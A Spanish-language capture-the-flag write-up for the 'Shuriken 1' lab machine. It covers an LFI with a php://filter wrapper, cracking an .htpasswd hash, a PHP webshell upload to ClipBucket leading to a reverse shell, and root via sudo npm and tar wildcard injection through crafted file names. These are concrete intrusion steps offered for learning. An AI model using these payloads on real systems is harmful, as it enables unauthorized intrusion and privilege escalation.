# Shuriken 1

Tags: [[_analysis]],[[_infoLeakage]],[[_lfi]],[[_cracking]],[[_cms]],[[_webExploitation]],[[_sudoersAbusing]],[[_timeTasks]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Bionic.

Puertos abiertos.
80 - HTTP


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

80
whatweb reporta solo el título "Shuriken", servidor apache y poco más.
El script http-enum de nmap reporta una rutas.

Hay un login, y una ruta secret donde hay una imagen secreta, pero es poca cosa.
En una ruta /js hay contenido que seguramente hagan algo.
Podemos entrar a https://beautifier.io/ y pasarle el código.
Así lo vemos mejor y lo podemos analizar.
Veo que se hace mención a una ruta:
"http://broadcast.shuriken.local"
Lo meto en el /etc/hosts y ya e resuelve.
Se menciona en el otro código: shuriken.local
Lo mismo.
Metí shuriken también.
Solo broadast.shuriken.local me manda a un panel de autenticación, las otras dos me llevan a lo mismo.

Podría brute forcear pero no tengo usuarios, y no puedo fuzzear directorios.
Podría fuzzear más potente en la web principal para ver si encuentro algo más.

En el segundo .js 
Veo que hace mención a "http://shuriken.local/index.php?referer=" 
Donde referer es un parámetro.
Desde la web no vemos mucho, hagámoslo desde curl.
PROBAR.
Remote File Inclusion.
Local File Inlusion.

Propenso a un LFI.
...referer=/etc/passwd
Procedamos a enumerar.

/etc/passwd nos da los usuarios a nivel de sistema.
root
server-management
Recordemos que tenemos 2 paneles donde poder hacer Brute Force. 

Hacer
<span style="color:#ecacb6">curl -s -X GET "http://shuriken.local/index.php?referer=php://filter/convert.base64-encode/resource=index.php"</span> :  usamos un wrapper para ver el código sin que lo interprete.
Es la misma web principal pero las funciones de php no las interpreta y las puedo ver.


Como se está aplicando Virtual Hosting y hay dominios configurados podríamos ver cosas.

Podríamos ver:
/etc/apache2/sites-enabled/000-default.conf
Nos da una ruta /etc/apache2/.htpasswd
Dentro hay una credencial.
<span style="color:#ecacb6">developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0</span>
Que es de autenticación al dominio broadcast.shuriken.local

Es un Hash, así que tratemos de crackearlo con john.
<span style="color:#88c425">john -w:/usr/share/wordlists/rockyou.txt credentials.txt</span>
developers:9972761drmfsls

Las probamos y pa dentro.

Se usa ClipBucket.
No estamos logueados.
Version 4.0

Vemos algo de añadir colección.
Pero antes veamos vulnerabilidades en Searchsploit.

Vemos unas cuantas para la versión anterior a 4.0.0, pero podríamos intentarlo.

IMPORTANTE.
Para hacer un curl a ese dominio, necesito autenticarme en la misma petición, si no, no es posible.
Se hace así
<span style="color:#88c425">curl -s -X GET "http://developers:9972761drmfsls@broadcast.shuriken.local"</span>
Continuamos.
Creamos el archivo .php para subirlo y lo subimos, nos pone success.
Perfecto... y, dónde se almacenó? xdd

Veo que al subir me dice el directorio, es como la fecha de creación pero no más.

Fuzzeemos URIs.
/files/photos/2024/06/22 ahí está nuestro archivo, lo abrimos y jugamos con el parámetro cdm.
Una reverse shell y pa deeentro.


## Escalada

Estamos como www-data
Tratamiento de la TTY.

Enumerar todo.
sudo -l :    podemos ejecutar npm como server-management
<span style="color:#379075">sudo -u user :     para ejecutar comando.</span>

Hay una forma, pero de primeras hay problemas, porque lo que pasa es que www-data está creando un archivo antes, que después el usuario server-management no tiene permisos sobre el, entonces quité eso y creé el directorio con permios 777, lo referencié, lo ejecuté y pa deeentro.

<span style="color:#bef202">Elevar privilegios a root.</span>
Hay un comando pppd con el grupo "dip" asignado, y server-management está en ese grupo, pero solo para leer.

Estamos en el grupo lpadmin.

Pero no vemos mucho más, así que analicemos tareas que se estén ejecutando a intervalos regulares de tiempo.

Juguemos con pspy
Lo descargo, lo comparto en un servidor.
Y en la máquina víctima con curl:
<span style="color:#88c425">curl 192.168.0.11/pspy64 -o pspy</span>
Le damos permisos de ejecución y ejecutamos.

Vemos un comando con tar, lo usa en un script donde engloba todos los archivos en Documents/, metemos algo ahí para ver cómo se comporta.

Podemos pensar en hacer archivos con nombres de parámetros para ejecutar comando con tar.

Sí lo hace, hagamos esa idea.
Para crear un fichero con "--", se hace así
<span style="color:#88c425">touch -- --pepe</span>
Para borrarlo
<span style="color:#88c425">rm -- -pepe</span>

Hice 

<span style="color:#88c425">touch -- --checkpoint=1</span>
<span style="color:#88c425">touch -- --checkpoint-action=exec='sh command'</span> :    para después crear el archivo "command"
El cual le asignara el SUID a la bash.

Es esperar, se lo asigna
Hacemos
/bin/bash -p 
Y pa deeeeeeentro.
Fin.



